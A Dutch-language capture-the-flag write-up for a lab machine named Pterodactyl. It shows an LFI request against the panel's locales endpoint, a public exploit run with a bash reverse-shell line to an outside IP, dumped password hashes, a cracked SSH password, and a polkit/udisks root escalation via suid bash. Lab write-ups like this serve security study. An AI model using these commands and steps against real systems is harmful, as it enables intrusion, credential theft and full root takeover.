# Pterodactyl

Wanneer we kijken dan lijkt dit iets om een minecraft server te hosten. Er is
ook een changelog en al vrij rap met wat fuzzing en rondklikken vinden we het
volgende:

- Meerdere subdomeinen, `play.pterodactyl.htb` / `panel.pterodactyl.htb`
- Een interessante pagina op `/phpinfo.php`

# Panel

Voor nu lijkt `panel.pterodactyl.htb` het interessants. Een zoekactie op CVE en
we vinden CVE-2025-49132. Hiermee kunnen we via het `locales` endpoint een LFI
doen.

```
GET /locales/locale.json?locale=../../../pterodactyl&namespace=config/database
```

Met een snelle google komen we de volgende POC tegen die exact doet wat we
willen
[github linkje](https://github.com/YoyoChaud/CVE-2025-49132/blob/main/exploit.py#L404)

Uitvoeren als volgt geeft een revshell:

```sh
./poc.py \
    --rce-cmd '/bin/bash -i >& /dev/tcp/10.10.15.129/9000 0>&1' \
    --pear-dir '/usr/share/php/PEAR' \
    http://panel.pterodactyl.htb
```

> _De PEAR dir hebben we uit de phpinfo gehaald die eerder gepost is. Voor meer
> info over hoe en wat random dit exploiteren check [deze blog](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)_

# Privesc wwwrun -> X

In `/etc/passwd` vinden we de volgende users die aanwezig zijn op deze machine:

```
headmonitor
phileasfogg3
wwwrun <-- Dit is de user waarmee we RCE hebben
```

Maar geluk wil dat er een DB draait waar we de volgende gegevens uit kunnen
halen:

```
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
| id | external_id | uuid                                 | username     | email                        | name_first | name_last | password                                                     | remember_token                                               | language | root_admin | use_totp | totp_secret | totp_authenticated_at | gravatar | created_at          | updated_at          |
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
|  2 | NULL        | 5e6d956e-7be9-41ec-8016-45e434de8420 | headmonitor  | headmonitor@pterodactyl.htb  | Head       | Monitor   | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 | OL0dNy1nehBYdx9gQ5CT3SxDUQtDNrs02VnNesGOObatMGzKvTJAaO0B1zNU | en       |          1 |        0 | NULL        | NULL                  |        1 | 2025-09-16 17:15:41 | 2025-09-16 17:15:41 |
|  3 | NULL        | ac7ba5c2-6fd8-4600-aeb6-f15a3906982b | phileasfogg3 | phileasfogg3@pterodactyl.htb | Phileas    | Fogg      | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi | 6XGbHcVLLV9fyVwNkqoMHDqTQ2kQlnSvKimHtUDEFvo4SjurzlqoroUgXdn8 | en       |          0 |        0 | NULL        | NULL                  |        1 | 2025-09-16 19:44:19 | 2025-11-07 18:28:50 |
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
```

Waarbij vooral de password hashes interessant zijn. Via `hashcat` komen we in
ieder geval achter de volgende user `phileasfogg3:!QAZ2wsx` waarmee we ook SSH
toegang hebben.

> _Sidenote, ghostty en alacritty gaan niet lekker met SSH maar is te fixen door
> `export TERM=xterm-256color` te doen_

# Privesc root

Via de database toegang kunnen we de `phileasfogg3` user een admin maken.
Hiermee zien we op `panel.pterodactyl.htb` een server draaien voor minecraft
maar deze is nog aan het opstarten. Dit suggereert wel dat er iets van
docker/podman/containerd aanwezig is om spul op te starten.

Veel getest maar ik krijg de server niet draaiend. Heb wel een CVE gevonden die
mogelijk interessant kan zijn. Gaat om [CVE-2025-6018 en CVE-2025-6019](https://cdn2.qualys.com/2025/06/17/suse15-pam-udisks-lpe.txt)

Met het volgen van de stappen die hierboven genoemd staan heb ik root gekregen.
In het kort:

- Check op een active user met: `gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot`
- Zo nee voeg `XDG_SEAT OVERRIDE=seat0` en `XDG_VTNR OVERRIDE=1` toe aan
  `~/.pam_environment`
- Log opnieuw in en als de omgeving vatbaar is voor CVE-2025-6018 dan ben je nu
  een active user

Als active user kan je net wat extra dingen.

```bash
grep -rl 'allow_active.*yes' /usr/share/polkit-1/actions
```

In dit geval gaat het om
`/usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy` en CVE-2025-6019.
Zie hiervoor ook de eerder genoemde blog voor meer info maar het komt neer op:

- Maak lokaal een `xfs` volume met daarin `/bin/bash` met suid bit gezet
- Kopieer deze naar de target
- Gebruik dit volume in een while loop
- Resize het image, dit crashed maar laat wel een `/tmp/blockdev.xxxx/` achter
- In dat temp bestand staat `/bin/bash` met de suid bit waarmee we root hebben
  `/tmp/blockdev.xxxx/bash -p`
